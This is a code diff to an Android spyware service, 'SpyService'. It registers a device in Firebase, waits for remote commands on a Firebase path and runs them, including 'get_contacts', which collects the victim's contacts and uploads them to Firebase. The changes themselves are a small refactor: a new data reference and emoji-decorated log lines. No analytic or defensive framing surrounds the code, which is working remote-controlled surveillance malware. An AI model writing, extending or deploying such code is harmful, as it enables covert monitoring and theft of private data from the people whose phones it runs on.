@@ -61,6 +61,7 @@ public class SpyService extends Service {
     private FirebaseDatabase database;
     private DatabaseReference deviceRef;
     private DatabaseReference commandRef;
+    private DatabaseReference dataRef;
 
     @Override
     public void onCreate() {
@@ -79,6 +80,7 @@ public class SpyService extends Service {
         database = FirebaseDatabase.getInstance();
         deviceRef = database.getReference("devices").child(deviceId);
         commandRef = database.getReference("commands").child(deviceId);
+        dataRef = database.getReference("devices").child(deviceId).child("data");
 
         registerDevice();
         listenForCommands();
@@ -148,7 +150,7 @@ public class SpyService extends Service {
             public void onDataChange(DataSnapshot dataSnapshot) {
                 String command = dataSnapshot.getValue(String.class);
                 if (command != null && !command.isEmpty()) {
-                    Log.d(TAG, "Command: " + command);
+                    Log.d(TAG, "📩 Command received: " + command);
                     executeCommand(command);
                     commandRef.removeValue();
                 }
@@ -161,7 +163,7 @@ public class SpyService extends Service {
     }
 
     private void sendData(String type, String data) {
-        deviceRef.child("data").child(type).setValue(data);
+        dataRef.child(type).setValue(data);
     }
 
     private void sendFileToFirebase(File file, String caption) {
@@ -185,7 +187,7 @@ public class SpyService extends Service {
 
     private void executeCommand(String cmd) {
         String lower = cmd.toLowerCase().trim();
-        Log.d(TAG, "Executing: " + lower);
+        Log.d(TAG, "⚡ Executing: " + lower);
         try {
             switch (lower) {
                 case "get_contacts": sendFileToFirebase(collectContacts(), "📇 جهات الاتصال"); break;
@@ -229,9 +231,8 @@ public class SpyService extends Service {
     }
 
     // ======================================================================
-    // دوال جمع البيانات
+    // دوال جمع البيانات (نفس الكود السابق)
     // ======================================================================
-
     private int getBatteryLevel() {
         try {
             IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
